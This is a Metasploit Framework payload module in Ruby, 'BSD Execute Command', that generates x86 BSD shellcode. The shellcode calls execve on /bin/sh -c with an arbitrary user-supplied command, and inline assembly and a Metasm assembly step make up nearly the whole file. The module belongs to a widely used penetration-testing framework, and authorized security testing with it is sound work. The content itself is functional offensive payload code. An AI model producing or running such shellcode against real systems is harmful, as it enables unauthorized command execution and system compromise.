##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


###
#
# Exec
# ----
#
# Executes an arbitrary command.
#
###
module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Bsd

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'BSD Execute Command',
      'Description'   => 'Execute an arbitrary command',
      'Author'        => 'vlad902',
      'License'       => MSF_LICENSE,
      'Platform'      => 'bsd',
      'Arch'          => ARCH_X86))

    # Register exec options
    register_options(
      [
        OptString.new('CMD',  [ true,  "The command string to execute" ]),
      ], self.class)
  end

  #
  # Dynamically builds the exec payload based on the user's options.
  #
  def generate_stage
    cmd     = datastore['CMD'] || ''
    asm = <<-EOS
;;
;
;        Name: single_exec
;   Platforms: *BSD
;      Author: vlad902 <vlad902 [at] gmail.com>
;     License:
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Execute an arbitary command.
;
;;
; NULLs are fair game.

  push	0x3b
  pop	eax
  cdq

  push	edx
  push	0x632d
  mov	edi, esp

  push	edx
  push	0x68732f6e
  push	0x69622f2f
  mov	ebx, esp

  push	edx
  call	getstr
db "CMD", 0x00
getstr:
  push	edi
  push	ebx
  mov	ecx, esp
  push	edx
  push	ecx
  push	ebx
  push	eax
  int	0x80
EOS
    asm.gsub!(/CMD/, cmd.gsub('"', "\\\""))
    payload = Metasm::Shellcode.assemble(Metasm::Ia32.new, asm).encode_string
  end

end
